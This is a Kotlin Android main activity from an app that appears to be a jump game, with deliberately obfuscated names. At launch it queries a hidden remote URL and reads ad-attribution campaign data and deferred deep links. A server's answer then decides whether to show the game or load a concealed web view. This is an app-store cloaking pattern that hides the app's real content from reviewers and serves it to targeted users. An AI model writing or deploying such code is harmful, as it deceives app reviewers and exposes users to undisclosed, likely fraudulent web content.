package com.jumpgame.lightblack

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.jumpgame.databinding.ActivityMainBinding
import com.jumpgame.ligghtwhite.MainLightScreen
import com.jumpgame.lightblack.AppClassLight.Companion.JKSKDKWQDOQWOD
import com.jumpgame.lightblack.AppClassLight.Companion.VXVCGSAGCQWHDQWJD
import com.jumpgame.lightblack.AppClassLight.Companion.ISDUUQWDUQWDQ
import com.jumpgame.lightblack.AppClassLight.Companion.odwqpdoqowdoqw
import com.jumpgame.lightblack.AppClassLight.Companion.gsgdhwqiiokdlwqkk
import com.jumpgame.lightblack.AppClassLight.Companion.ggsdhiqwidmwqidqw
import com.jumpgame.lightblack.AppClassLight.Companion.tysdyuuwqid
import com.jumpgame.lightblack.AppClassLight.Companion.bxgdghdjwqjdqjw
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var gsgdhwqjdqwd: ActivityMainBinding

    var uefuwufwewe: Boolean = false
    lateinit var yydywqdqwdqdqw: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        gsgdhwqjdqwd = ActivityMainBinding.inflate(layoutInflater)
        setContentView(gsgdhwqjdqwd.root)
        yydywqdqwdqdqw = ""
        vxgfcgtgdghqwduqwdqw(this)
        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            GlobalScope.launch {
                vxgghdjwqdkwkdqwdwidqw()
            }
            finish()
        } else {
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()
            val job = GlobalScope.launch(Dispatchers.IO) {
                uefuwufwewe = rrdtwqydyqwydqwd(bxgdghdjwqjdqjw+gsgdhwqiiokdlwqkk)
                Log.d("CHECKAPPS", "I did something")
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            if (uefuwufwewe){
                AppsFlyerLib.getInstance()
                    .init(ISDUUQWDUQWDQ, conversionDataListener, applicationContext)
                AppsFlyerLib.getInstance().start(this)
                bxghchjasckakcksaca(1500)

            } else {
                GlobalScope.launch(Dispatchers.IO) {
                    vxgghdjwqdkwkdqwdwidqw()
                }
            }
        }

    }



    private suspend fun rrdtwqydyqwydqwd(link: String): Boolean {
        val url = URL(link)
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text == "1") {
                Log.d("jsoup status", text)
                true
            } else {
                Log.d("jsoup status", "is null")
                false
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun bxghchjasckakcksaca(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(JKSKDKWQDOQWOD, null)
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    vxgghdjwqdkwkdqwdwidqw()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(JKSKDKWQDOQWOD, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()

            val dataGotten = data?.get("campaign").toString()
            editor.putString(JKSKDKWQDOQWOD, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    fun vxgfcgtgdghqwduqwdqw(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host

                editor.putString(VXVCGSAGCQWHDQWJD, params.toString())
                editor.apply()
            }
            if (appLinkData == null) {

            }
        }
    }


    private fun fsrdrrwqdqdqwd(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                yydywqdqwdqdqw = text
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
    private suspend fun vxcghheqweqeqwe(): String {
        val sharedPref = getSharedPreferences("SP", MODE_PRIVATE)

        val nameParameter: String? = sharedPref.getString(JKSKDKWQDOQWOD, null)
        val appLinkParameter: String? = sharedPref.getString(VXVCGSAGCQWHDQWJD, null)


        val taskName = "$tysdyuuwqid$odwqpdoqowdoqw$ggsdhiqwidmwqidqw$nameParameter"
        val taskLink = "$tysdyuuwqid$odwqpdoqowdoqw$ggsdhiqwidmwqidqw$appLinkParameter"

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (nameParameter != "null") {
                fsrdrrwqdqdqwd(taskName)
                Log.d("Check1C", taskName)
            } else {
                fsrdrrwqdqdqwd(taskLink)
                Log.d("Check1C", taskLink)
            }
        }
        return yydywqdqwdqdqw
    }

    private suspend fun vxgghdjwqdkwkdqwdwidqw(){
        val job = GlobalScope.launch(Dispatchers.IO) {
            yydywqdqwdqdqw = vxcghheqweqeqwe()
            Log.d("jsoup status from global scope", yydywqdqwdqdqw)
        }

        job.join()
        Log.d("jsoup status out of global scope", yydywqdqwdqdqw)

        if (yydywqdqwdqdqw == AppClassLight.ystdttqwdqw) {
            Intent(applicationContext, MainLightScreen::class.java).also { startActivity(it) }
        } else {
            Intent(applicationContext,LightWeb::class.java).also { startActivity(it) }
        }
        finish()
    }
}